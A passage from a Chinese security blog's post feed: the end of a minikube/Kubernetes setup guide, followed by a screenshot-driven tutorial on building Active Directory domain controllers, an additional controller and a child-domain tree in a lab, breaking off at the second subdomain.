operator">/</span>releases<span class="token operator">/</span>download<span class="token operator">/</span>v1<span class="token punctuation">.</span><span class="token number">25.0</span><span class="token operator">/</span>crictl<span class="token operator">-</span>v1<span class="token punctuation">.</span><span class="token number">25.0</span><span class="token operator">-</span>linux<span class="token operator">-</span>amd64<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gzsudo tar zxvf crictl<span class="token operator">-</span>v1<span class="token punctuation">.</span><span class="token number">25.0</span><span class="token operator">-</span>linux<span class="token operator">-</span>amd64<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz <span class="token operator">-</span>C <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span>ln <span class="token operator">-</span>s <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>crictl <span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>crictl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="minikube控制台"><a href="#minikube控制台" class="headerlink" title="minikube控制台"></a>minikube控制台</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">minikube dashboard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664986811454-20e5e452-84b3-4332-b323-fa6433b53d67.png" alt="img"></p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664986877512-5d09c41c-96e2-4a45-94ea-77c7739f5212.png" alt="img"></p><p>Minikube启动Dashboard后返回的地址只是容器代理出来的地址只能本机内网访问，默认只能localhost访问，如果需要开放外部访问需要使用kubectl执行如下命令添加代理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kubectl proxy <span class="token operator">-</span><span class="token operator">-</span>port<span class="token operator">=</span><span class="token number">8000</span> <span class="token operator">-</span><span class="token operator">-</span>address<span class="token operator">=</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span><span class="token operator">-</span>accept<span class="token operator">-</span>hosts<span class="token operator">=</span><span class="token string">'^.*'</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664986949587-846e41f4-e439-4b15-936c-1dd2df72d1e0.png" alt="img"></p><p>设置好后即可非本地的ip访问dashboard 的UI 界面了:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.35</span><span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>api<span class="token operator">/</span>v1<span class="token operator">/</span>namespaces<span class="token operator">/</span>kubernetes<span class="token operator">-</span>dashboard<span class="token operator">/</span>services<span class="token operator">/</span>http<span class="token punctuation">:</span>kubernetes<span class="token operator">-</span>dashboard<span class="token punctuation">:</span><span class="token operator">/</span>proxy<span class="token operator">/</span><span class="token comment">#/workloads?namespace=default</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664987132684-37040b03-0414-41c9-afa8-5fa388576b01.png" alt="img"></p><h2 id="minikube的使用"><a href="#minikube的使用" class="headerlink" title="minikube的使用"></a>minikube的使用</h2><p>​    用户使用Minikube CLI管理虚拟机上的Kubernetes环境，比如：启动，停止，删除，获取状态等。一旦Minikube虚拟机启动，用户就可以使用熟悉的Kubectl CLI在Kubernetes集群上执行操作。</p><p>​    Minikube 也提供了丰富的 Addon 组件,通过 minikube 命令行，可以轻松开启 Addon 组件，所有组件镜像也会正确解析到阿里云的镜像仓库URL。</p><p><img src="/2022/10/21/yun-an-quan/k8s-huan-jing-da-jian/1664987267233-1cb5dfb4-29c4-4466-af82-6fb4463bf575.png" alt="img"></p><p>参考：<a href="https://mp.weixin.qq.com/s/21PTxhHKM57N_xagKTZ6rA">https://mp.weixin.qq.com/s/21PTxhHKM57N_xagKTZ6rA</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域的搭建和配置</title>
      <link href="2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/"/>
      <url>2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/</url>
      
        <content type="html"><![CDATA[<p>本文部分节选于《域渗透攻防指南》，购买请长按如下图片扫码</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/image-20230306213529401.png" alt="image-20230306213529401"></p><p>这节我们主要将搭建不同的域架构环境。</p><p>在域架构中，最核心的就是DC(Domain Control，域控制器)。域控制器可分为三种：域控制器、额外域控制器和只读域控制器(RODC)。创建域环境首先要创建DC，DC创建完成后，把所有需要加入域的客户端加入到DC，这样就形成了域环境。网络中创建的第一台域控制器，默认为林根域控制器，也是全局编录服务器，FSMO操作主机角色也默认安装到第一台域控制器。 一个域环境中可以有多台域控制器，也可以只有一台域控制器。当有多台域控制器的时候，每一台域控制器的地位几乎是平等的，他们各自存储着一份相同的活动目录数据库。当你在任何一台域控制器内添加一个用户账号或其他信息后，此信息默认会同步到其他域控制器的活动目录数据库中。多个域控制器的好处在于当有域控制器出现故障了时，仍然能够由其他域控制器来提供服务。</p><p>以下演示搭建Windows Server 2008R2域功能级别的域环境和Windows Server 2012 R2域功能级别的域环境以及Windows Server 2012 R2域功能级别的域树。</p><p>域控制器是由工作组计算机升级而成，只有Windows Server（WEB版本除外）系统才可以提升为域控制器。服务器想要升级为域控制器，需要满足以下条件：</p><ul><li>具有NTFS文件系统，因为SYSVOL文件夹需要NTFS文件系统。</li><li>静态ip地址，因为域控制器需要静态的ip。</li><li>如果是安装第一个域的域控，需要该服务器本地管理员权限。如果是安装现有域的额外域控制器，需要该域的域管理员权限。如果是安装子域的域控，需要企业管理员权限。</li></ul><h1 id="搭建Windows-Server-2008R2域功能级别"><a href="#搭建Windows-Server-2008R2域功能级别" class="headerlink" title="搭建Windows Server 2008R2域功能级别"></a>搭建Windows Server 2008R2域功能级别</h1><p>以下将Windows Server 2008R2服务器升级为域控制器为例，该服务器ip地址为10.211.55.7。</p><p>首先，配置服务器的ip地址为静态ip以及DNS服务器设置为自身。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633448568534-6f28977a-a3b2-416d-bdf5-00a2b96c8a49.png" alt="img"><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1627196881957-45fecc34-49bc-48a4-a7ea-15797fff6d55.png" alt="img"></p><p>注：以下创建域环境我们选择的是创建Active Directory“集成区域DNS服务”。也就是域控同时担任DNS服务器。此时，域控的DNS服务器需要为自身。</p><p>然后在cmd窗口输入：<strong>dcpromo</strong> 来升级此服务器为域控。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633448603020-a006e6ef-5a5c-40df-a585-0716f5eccd72.png" alt="img"></p><p>过一会之后，会弹出如下安装向导，点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633448673773-24e8957e-8cdf-475a-867c-446d08dfc65d.png" alt="img"></p><p>然后会显示操作系统兼容性，我们直接点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633448688394-d8141df6-77c6-4322-b539-caed16c824b3.png" alt="img"></p><p>这里我们选择在新林中新建域，然后点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633448770124-1d086daf-809b-48a9-8d60-1905d0b006e6.png" alt="img"></p><p>输入域的名字，我们这里是xie.com，然后点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633448838127-a505cddd-9c2c-467e-89ca-ec4099902b96.png" alt="img"></p><p>这里我们选择Windows Server 2008R2的林功能级别，然后点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633448876268-65272b44-82d0-4a2f-95ea-76c8509f2f8e.png" alt="img"></p><p>然后它会自动检查DNS的配置，需要一会时间。如果你主机原来没有安装DNS服务器的话，它会自动帮你勾选上DNS服务器，然后点击下一步即可，这时会弹出无法创建DNS服务器的委派，不用管它，直接点击“是”即可。然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633448930090-1d4f833e-5e84-4721-8b31-ff243f298fc1.png" alt="img"></p><p>这里会显示一些文件的位置，因为SYSVOL域共享文件必须得在NTFS文件系统的磁盘上，所以域控服务器必须得有NTFS文件系统的分区。</p><ul><li>数据库文件夹：用于存储活动目录数据库。</li><li>日志文件文件夹：用于存储活动目录数据库的变更记录，此记录文件可用来修复活动目录数据库。</li><li>SYSVOL文件夹：用于存储域共享文件(例如组策略相关的文件)。</li></ul><p>若计算机内有多块硬盘，建议将数据库与日志文件夹分别设置到不同硬盘内，因为两块硬盘分开工作可以提高读写效率，而且分开存储可以避免两份数据同时出现问题，以提高修复活动目录数据库的能力。</p><p>这里我们保持默认，点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633448946013-01718be6-1c01-4006-b56c-80a88e4fca0f.png" alt="img"></p><p>这里填目录还原模式的Administrator密码，然后点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633449074348-32b3820a-9128-4b43-b749-79157676b717.png" alt="img"></p><p>注：目录还原模式密码和域管理员密码不同。该模式主要是用来还原Active Directory数据库，该密码必须符合密码策略</p><p>然后需要确定一些配置，没问题的话点击下一步即可。然后开始配置Active Directory域服务，配置需要一段时间，配置完成后，点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633449276110-f71dfa01-5b10-429c-bd08-e17285fab65e.png" alt="img"><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633449275781-5edef25a-76db-450e-b07e-db9d8a332d08.gif" alt="img"></p><p>如图所示，提示Active Direcory域服务安装完成。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633449296748-9308615e-90ec-445d-9aeb-1eecd3b38b1f.png" alt="img"><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1633449296530-f7ef1ae6-033f-41ae-a9f1-0ab621f224fe.gif" alt="img"></p><p>然后需要重新启动计算机以完成配置。重启后，打开管理工具——&gt;Active Directory用户和计算机，显示如图所示，说明活动目录服务安装成功！</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634397361950-c04ea6e1-0a80-4f98-8e19-eeef5a56d1bc.png" alt="img"></p><h1 id="搭建Windows-Server-2012R2域功能级别"><a href="#搭建Windows-Server-2012R2域功能级别" class="headerlink" title="搭建Windows Server 2012R2域功能级别"></a>搭建Windows Server 2012R2域功能级别</h1><p>以下将Windows Server 2012 R2服务器升级为域控，该服务器ip地址为10.211.55.4。安装时主机名为win2012，安装后修改为AD。</p><p>首先，配置服务器的ip地址为静态ip以及DNS服务器设置为自身。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353262154-363ef6d4-e1f0-4303-a12a-724246d720d4.png" alt="img"></p><p>注：以下创建域环境我们选择的是创建Active Directory“集成区域DNS服务”。也就是域控同时担任DNS服务器。此时，域控的DNS服务器需要为自身。</p><p>Windows Server 2012R2安装域控分为两步，先安装ADDS活动目录域服务和DNS服务，然后再将其提升为域控制器。</p><h2 id="1-安装AD-DS域服务和DNS服务"><a href="#1-安装AD-DS域服务和DNS服务" class="headerlink" title="1. 安装AD DS域服务和DNS服务"></a>1. 安装AD DS域服务和DNS服务</h2><p>打开服务器管理器——&gt;点击添加角色和功能。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353341290-f8d0e24a-6d1d-4148-97e5-e6125df4a417.png" alt="img"></p><p>勾选“基于角色或基于功能的安装”选项，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353362031-a8eab013-9c23-48f8-aa4b-a3da6ebc7abb.png" alt="img"></p><p>勾选“从服务器池中选择服务器”选项，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353400379-ecd40060-9da4-41e4-8d02-73062d5d8422.png" alt="img"></p><p>然后这里勾选“Active Directory域服务”和“DNS服务器”选项，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353442244-d0f46a7e-f264-4985-833a-918f06998df0.png" alt="img"></p><p>这里到了选择功能的对话框，保持默认即可，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353479166-e7b64adc-1219-45cb-826b-43a8e94e4b24.png" alt="img"></p><p>这里显示Active Directory域服务的描述以及注意事项。直接点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353505017-7a70667c-ded7-467f-8610-775bff0ecc50.png" alt="img"></p><p>这里显示DNS服务器描述以及注意事项。直接点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353523171-cbcbc98f-0ca3-47d3-acb8-8a0fe97ac230.png" alt="img"></p><p>这里到了确认安装所选内容对话框，勾选“如果需要，自动重新启动目标服务器”选项，然后点击安装。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353556792-9140b450-3fab-4294-8daa-bc615cfa2c44.png" alt="img"></p><p>如下所示，显示安装完成。点击关闭即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353665650-9a9184b6-580c-41ee-8990-93856f876666.png" alt="img"></p><h2 id="2-提升为域控制器"><a href="#2-提升为域控制器" class="headerlink" title="2. 提升为域控制器"></a>2. 提升为域控制器</h2><p>接下来就需要将该服务器提升为域控制器。我们可以在服务器管理器这里看到部署后配置，点击“将此服务器提升为域控制器”。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353696747-37f6e3a4-7952-4788-8566-97124c010161.png" alt="img"></p><p>会弹出Active Directory域服务配置向导，这里我们勾选“添加新林(F)”。然后填入域名 xie.com 。然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353783738-4b442b2c-6396-4ec0-a788-1e4f8dc7c2f9.png" alt="img"></p><p>这里域功能级别和林功能级别我们勾选Windows Server 2012 R2。指定域控制器功能这里默认勾选了“域控系统(DNS) 服务器(O)”和“全局编录(GC)(G)”。然后输入目录服务还原模式(DSRM)密码。然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353910716-21aefc10-dd93-4e65-b2ba-272abb2e964d.png" alt="img"></p><p>注：目录还原模式密码和域管理员密码不同。该模式主要是用来还原Active Directory数据库，该密码必须符合密码策略</p><p>这里会提示“无法创建该DNS服务器的委派，因为无法找到有权威的父区域或者它未运行Windows DNS服务器”。这是由于DNS部署方式为“Active Directory集成区域DNS服务”，并没有部署独立的DNS服务器，因此无法创建该DNS服务器的委派。这是正常的，直接点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634353951396-e4c15315-3394-4442-8a69-9f8c9963af7b.png" alt="img"></p><p>由于域名是xie.com，所以这里的NetBIOS域名默认填为 XIE，我们保持默认，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634354230536-29be8450-a032-4d76-b7e5-8180fee55b29.png" alt="img"></p><p>这里的数据库文件夹、日志文件文件夹和SYSVOL文件夹我们保持默认即可，然后点击下一步。如图所示：</p><ul><li>数据库文件夹：用于存储活动目录数据库。</li><li>日志文件文件夹：用于存储活动目录数据库的变更记录，此记录文件可用来修复活动目录数据库。</li><li>SYSVOL文件夹：用于存储域共享文件(例如组策略相关的文件)。</li></ul><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634354271620-87618007-8bc5-488d-9e36-2c9ff6ce826b.png" alt="img"></p><p>这里会看到我们之前的选择和设置，如果没问题直接点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634354314479-b6cb1ad4-0191-4108-8df2-ebcce56f1f60.png" alt="img"></p><p>然后这里会检查先决条件，只有先决条件没问题了才可以继续安装。</p><p>如图所示，提示先决条件失败，主要原因是本地Administrator帐户密码不符合要求。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634354352355-3b7a84f5-a8f6-41db-afcf-0bae2ecd33d5.png" alt="img"></p><p>我们在命令行中输入如下命令后，点击重新运行先决条件检查。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">net user administrator <span class="token operator">/</span>passwordreq<span class="token punctuation">:</span>yes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图所示，执行命令：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634354504000-f42f36b2-a925-4db3-9ba0-2935aa1b8ed5.png" alt="img"></p><p>然后点击重新运行先决条件检查，如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634354561212-14a83af5-7693-4c8c-b86d-1551c5284e73.png" alt="img"></p><p>如图所示，显示“所有先决条件检查都成功通过”。然后点击安装即可进行安装了。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634354614232-6f6ce0dc-adf6-413e-9d23-3dc75a2732e3.png" alt="img"></p><p>之后服务器会重启，重启后登录，使用之前本地administrator的账号密码登录，可能会提示你修改密码。</p><p>登录成功后，打开 服务器管理器——&gt;工具——&gt;Active Directory用户和计算机。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634355145409-a4f00fe7-b058-4d3e-aaf5-a9e51880bea4.png" alt="img"></p><p>显示如图所示，说明域控搭建完成！</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634355124841-8d8ff50c-7cf6-41d9-8595-12fbe7f115ab.png" alt="img"></p><h1 id="搭建额外域控制器"><a href="#搭建额外域控制器" class="headerlink" title="搭建额外域控制器"></a>搭建额外域控制器</h1><p>我们在上面搭建完成Windows Server 2012 R2域控的基础上搭建一个额外域控制器。多个域控制器的好处在于当其中有域控制器出现故障了，仍然能够由其他域控制器来提供服务。选择一台Windows Server2012 R2服务器作为额外域控制器，ip为10.211.55.8，主机名AD02。</p><p>首先在AD02上设置静态的ip以及DNS服务器为xie.com的域控10.211.55.4。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398264336-414da6a9-ac6b-41d4-836e-a2ec0f465276.png" alt="img"></p><p>然后开始安装ADDS域服务和DNS服务。这个步骤和上面我们搭建Windows Server 2012R2域功能级别一模一样，故不演示。我们直接从提升为域控制器开始操作。我们可以在服务器管理器这里看到部署后配置，点击“将此服务器提升为域控制器”。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398478018-e73e1bb6-a24f-4f8d-ac23-df06b32a1563.png" alt="img"></p><p>会弹出Active Directory域服务配置向导，这里我们勾选“将域控制器添加到现有域(D)”。然后填入域名 xie.com 。接着点击更改输入域管理员账号密码，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398523394-ab51f912-890d-4b91-9135-500ea1c124da.png" alt="img"></p><p>这里指定域控制器功能和站点信息为“域控系统(DNS) 服务器(O)”和“全局编录(GC)(G)”。然后输入目录服务还原模式(DSRM)密码。然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398581913-9103ebc9-8be4-4486-8198-e5987d9aaca9.png" alt="img"></p><p>注：目录还原模式密码和域管理员密码不同。该模式主要是用来还原Active Directory数据库，该密码必须符合密码策略</p><p>这里会提示“无法创建该DNS服务器的委派，因为无法找到有权威的父区域或者它未运行Windows DNS服务器”。这是由于DNS部署方式为“Active Directory集成区域DNS服务”，并没有部署独立的DNS服务器，因此无法创建该DNS服务器的委派。这是正常的，直接点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398632591-26490566-304c-4604-b0dd-a66636e9db85.png" alt="img"></p><p>然后这里选择复制自第一台域控制器AD.xie.com。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398661622-154a443a-f7bf-45b5-9332-3a6ab89108c8.png" alt="img"></p><p>这里的数据库文件夹、日志文件文件夹和SYSVOL文件夹我们保持默认即可，然后点击下一步。如图所示：</p><ul><li>数据库文件夹：用了存储活动目录数据库</li><li>日志文件文件夹：用了存储活动目录数据库的变更记录，此记录文件可用来修复活动目录数据库</li><li>SYSVOL文件夹：用了存储域共享文件(例如组策略相关的文件)</li></ul><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398700385-38199bbe-4a45-4a67-a5a4-996e74ee972a.png" alt="img"></p><p>这里会看到我们之前的选择和设置，如果没问题直接点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398726681-a306a3f6-f089-452f-8f5d-1250d573de9e.png" alt="img"></p><p>然后这里会检查先决条件，只有先决条件没问题了才可以继续安装。如下，所有先决条件检查都通过，点击安装即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398780097-7e446931-fcbc-4312-bf0f-eb172da55f7d.png" alt="img"></p><p>之后服务器会重启，重启后登录，使用之前本地administrator的账号密码登录，可能会提示你修改密码。登录成功后，打开 服务器管理器——&gt;工具——&gt;Active Directory用户和计算机。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398916852-a09fc38f-9182-4a87-9960-7a6a3e34dfb3.png" alt="img"></p><p>显示如图所示，说明额外域控制器安装成功！</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634398931624-c6784eae-dcac-4ddc-8a00-8c073f96baaa.png" alt="img"></p><p>域控之间手动同步数据，使用如下命令：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">repadmin <span class="token operator">/</span>syncall <span class="token operator">/</span>force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如图所示，域控之间手动同步数据。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634399544048-23bf94c6-d8d7-47db-b94b-b3bb19630a19.png" alt="img"></p><h1 id="搭建域树"><a href="#搭建域树" class="headerlink" title="搭建域树"></a>搭建域树</h1><p>我们在上面搭建完成Windows Server 2012R2域功能级别的基础上来搭建一个域树。shanghai.xie.com和beijing.xie.com作为xie.com的子域。</p><p>域树架构图如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634379232817-29aa68c0-a6bc-490d-a5ae-d7e05b4ff2ec.png" alt="img"></p><p>首先准备两个服务器作为子域shanghai.xie.com和beijing.xie.com的域控。配置如下：</p><ul><li>shanghai.xie.com的域控服务器为Windows Server 2016 Datacenter，主机名为SH-AD，ip为：10.211.55.13。</li><li>beijing.xie.com的域控服务器为Windows Server 2019 Datacenter，主机名为BJ-AD，ip为：10.211.55.14。</li></ul><p>然后开始下面的安装步骤：</p><h2 id="1-子域shanghai-xie-com安装"><a href="#1-子域shanghai-xie-com安装" class="headerlink" title="1. 子域shanghai.xie.com安装"></a>1. 子域shanghai.xie.com安装</h2><p>首先在SH-AD上设置静态的ip以及DNS服务器为xie.com的域控10.211.55.4。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634375470366-1f84bd81-4fe8-4be0-8268-1b239d06b38a.png" alt="img"></p><h3 id="1-安装AD-DS域服务和DNS服务-1"><a href="#1-安装AD-DS域服务和DNS服务-1" class="headerlink" title="(1) 安装AD DS域服务和DNS服务"></a>(1) 安装AD DS域服务和DNS服务</h3><p>这里安装ADDS域服务和DNS服务操作步骤和前面的一样，这里就不再赘述。</p><p>如图所示，显示安装完成。点击关闭即可。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376176939-76abe7ca-ac15-416b-8d44-b9a3f56d6832.png" alt="img"></p><h3 id="2-提升为域控制器-1"><a href="#2-提升为域控制器-1" class="headerlink" title="(2) 提升为域控制器"></a>(2) 提升为域控制器</h3><p>接下来就需要将该服务器提升为域控制器。我们可以在服务器管理器这里看到部署后配置，点击“将此服务器提升为域控制器”。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376274251-5bfbf5cf-5517-4651-a42a-1086e45be443.png" alt="img"></p><p>会弹出Active Directory域服务配置向导，这一步很重要。这里我们勾选“将新域添加到现有林(E)”。然后填入父域名xie.com和子域名shanghai。这里还需要提供一个凭据，我们点击更改，填入xie.com的企业管理员账号密码作为有效凭据。然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376561174-0bf74aff-0e18-4ad3-b2bb-560da8d25f8b.png" alt="img"></p><p>这里域功能级别手动勾选Windows Server 2012 R2，指定域控制器功能为“域控系统(DNS) 服务器(O)”和“全局编录(GC)(G)”。然后输入目录服务还原模式(DSRM)密码。然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376726139-83a46ef9-a726-4d5d-ae91-8ebf22b63048.png" alt="img"></p><p>注：目录还原模式密码和域管理员密码不同。该模式主要是用来还原Active Directory数据库，该密码必须符合密码策略</p><p>然后这里到了DNS选项，默认勾选了“创建DNS委派(D)”，我们保持默认，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376823372-fc95df13-a0d8-417f-81b5-0ed3f1d0483d.png" alt="img"></p><p>由于域名是shanghai.xie.com，所以这里的NetBIOS域名默认填为 SHANGHAI，我们保持默认，然后点击下一步。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376886041-84bdd6e6-506b-4d00-b222-140e94a23610.png" alt="img"></p><p>这里的数据库文件夹、日志文件文件夹和SYSVOL文件夹我们保持默认即可，然后点击下一步。如图所示：</p><ul><li>数据库文件夹：用于存储活动目录数据库。</li><li>日志文件文件夹：用于存储活动目录数据库的变更记录，此记录文件可用来修复活动目录数据库。</li><li>SYSVOL文件夹：用于存储域共享文件(例如组策略相关的文件)。</li></ul><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634376935050-6cea4c56-0f04-4a2a-a4a2-09e0d3e85cf8.png" alt="img"></p><p>这里会看到我们之前的选择和设置，如果没问题直接点击下一步即可。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634377024167-98930b2e-d859-456c-a6c5-9f943c07cc6d.png" alt="img"></p><p>然后这里会检查先决条件，只有先决条件没问题了才可以继续安装。</p><p>如图所示，所有先决条件检查都通过，点击安装即可。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634377116664-58517d68-958c-4b4c-9979-6b91506453fe.png" alt="img"></p><p>之后服务器会重启，重启后登录。登录成功后，打开 服务器管理器——&gt;工具——&gt;Active Directory用户和计算机。</p><p>可以看到如图所示，说明子域shanghai.xie.com域控制器搭建完成。</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634377644200-dd2eacde-2d6d-47a4-aca5-5492aa5ad856.png" alt="img"></p><p>并且在服务器管理器——&gt;工具——&gt;Active Directory域和信任关系中可以看到之间的信任关系。如图所示：</p><p><img src="/2022/03/12/yu-shen-tou-gong-fang/yu-de-da-jian-he-pei-zhi/1634377721040-0e9716e5-3130-4db2-a41f-0a359cf25b1c.png" alt="img"></p><h2 id="2-子域beijing-xie-com安装"><a 